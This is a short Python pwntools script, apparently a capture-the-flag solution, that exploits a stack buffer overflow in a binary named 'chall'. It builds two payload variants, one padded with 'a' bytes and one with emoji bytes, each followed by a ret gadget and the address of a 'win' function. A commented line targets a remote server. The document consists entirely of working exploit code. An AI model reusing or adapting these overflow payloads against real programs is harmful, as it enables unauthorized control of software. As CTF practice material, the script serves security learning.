from pwn import *


elf = context.binary = ELF("./chall")
p = process()
# p = remote("34.45.81.67",16002)
     
# gdb.attach(p)

# version 1

rop = ROP(elf)
offset = 280+8-1-8
binary = b'\x00'
binary += b"a"*(offset)
binary += p64(rop.ret.address)
print("length",len(binary))
binary += p64(elf.sym.win)
p.sendline(binary)
p.interactive()

# version 2

rop = ROP(elf)
offset = 280+8-1-8
binary = b'\x00'
binary += "😃".encode()* ((offset)//4)
binary += b'aaa' # for alignment 
binary += p64(rop.ret.address)
print("length",len(binary))
binary += p64(elf.sym.win)
p.sendline(binary)
p.interactive()
